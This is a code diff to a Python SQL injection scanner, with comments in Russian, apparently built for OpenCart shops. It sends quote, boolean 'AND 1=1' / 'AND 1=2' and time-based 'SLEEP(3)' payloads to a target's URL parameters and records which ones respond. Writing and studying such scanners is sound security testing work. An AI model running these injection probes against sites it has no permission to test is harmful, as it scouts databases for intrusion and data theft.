@@ -1,18 +1,16 @@
-# -*- coding: utf-8 -*-
+﻿# -*- coding: utf-8 -*-
+"""Проверка параметров на SQLi. Порядок: ошибка, булева пара, время (3 повтора)."""
+import statistics
 import time
 import urllib.parse
 
-from core import http, ui
+from core import findings, http, ui
 from modules import mods, profiles
-
-ROUTES = [
-    ("/index.php?route=product/product", "product_id", "1"),
-    ("/index.php?route=product/category", "path", "20"),
-    ("/index.php?route=product/search", "search", "a"),
-]
 
 ERR = ("sql syntax", "you have an error in your sql", "warning: mysqli",
        "mysql_fetch", "check the manual that corresponds")
+SLEEP = 3
+ROUNDS = 3
 
 
 def _url(route, param, value):
@@ -47,46 +45,82 @@ def _err(r):
     return ""
 
 
+def _timed(host, url, rounds=ROUNDS):
+    """Медиана времени по нескольким повторам."""
+    ds = []
+    for _ in range(rounds):
+        r, dt = _safe(host, url)
+        if r is None:
+            return 0.0
+        ds.append(dt)
+        time.sleep(0.2)
+    return statistics.median(ds)
+
+
 def run(host, kind="opencart"):
-    hits = []
-    routes = list(profiles.get(kind)["params"])
+    out = []
+    routes = list((profiles.get(kind) or {}).get("params") or [])
     if kind == "opencart":
         try:
             routes += mods.routes(mods.list_mods(host))
         except Exception:
             pass
+    if not routes:
+        ui.say("параметров для проверки нет")
+        return out
+
     for route, param, base in routes:
         ref, _ = _safe(host, _url(route, param, base))
         if ref is None:
-            ui.say("%-34s нет ответа" % param)
+            ui.say("%-28s нет ответа" % param)
             continue
         ref_len = len(ref.content)
+        url_base = _url(route, param, base)
 
         q, _ = _safe(host, _url(route, param, base + "'"))
-        if q is not None:
-            mark = ""
-            err = _err(q)
-            if err:
-                mark = "ОШИБКА SQL"
-                hits.append((route, param, "error", err))
-            elif abs(len(q.content) - ref_len) > max(800, ref_len // 10):
-                mark = "сдвиг размера"
-            ui.say("%-34s кавычка: %d %s" % (param, len(q.content), mark))
+        if q is None:
+            ui.say("%-28s сбой" % param)
+            continue
 
-        t0 = time.time()
-        _safe(host, _url(route, param, base + "' AND SLEEP(3)-- -"))
-        dt = time.time() - t0
-        if dt >= 2.5:
-            ui.say("%-34s время: %.1f c  ВРЕМЕННАЯ" % (param, dt))
-            hits.append((route, param, "time", "%.1f c" % dt))
+        if q.status_code == 403 and ref.status_code == 200:
+            ui.say("%-28s кавычка закрыта (403)" % param)
+            continue
+
+        err = _err(q)
+        if err:
+            ui.ok("%-28s ОШИБКА SQL" % param)
+            out.append(findings.make(host, _url(route, param, base + "'"), "sqli-error",
+                                     q.status_code, len(q.content), ref_len, q.text,
+                                     base + "'", err))
+            continue
+
+        a, _ = _safe(host, _url(route, param, base + "' AND 1=1-- -"))
+        b, _ = _safe(host, _url(route, param, base + "' AND 1=2-- -"))
+        if a is not None and b is not None:
+            la, lb = len(a.content), len(b.content)
+            if abs(la - lb) > max(300, la // 20):
+                ui.ok("%-28s БУЛЕВА: %d против %d" % (param, la, lb))
+                out.append(findings.make(host, _url(route, param, base + "' AND 1=2-- -"),
+                                         "sqli-bool", b.status_code, lb, la, b.text,
+                                         base + "' AND 1=2-- -"))
+                time.sleep(0.3)
+                continue
+
+        dt = _timed(host, _url(route, param, base + "' AND SLEEP(%d)-- -" % SLEEP))
+        if dt >= SLEEP * 0.7:
+            ui.ok("%-28s ВРЕМЕННАЯ: медиана %.1f c" % (param, dt))
+            out.append(findings.make(host, _url(route, param, base + "' AND SLEEP(%d)-- -" % SLEEP),
+                                     "sqli-time", 0, 0, ref_len, "",
+                                     base + "' AND SLEEP(%d)-- -" % SLEEP, "%.1f c" % dt))
         else:
-            ui.say("%-34s время: %.1f c" % (param, dt))
+            ui.say("%-28s чисто (медиана %.1f c)" % (param, dt))
         time.sleep(0.3)
 
     print()
-    if hits:
-        ui.ok("подозрительные параметры:")
-        for route, param, kind, extra in hits:
-            ui.say("  %s  %s  %s (%s)" % (route, param, kind, extra))
+    if out:
+        ui.ok("подозрительные параметры: %d" % len(out))
+        for f in out:
+            ui.say("  %s %s" % (f["tag"], f["url"]))
     else:
         ui.say("чисто")
+    return out
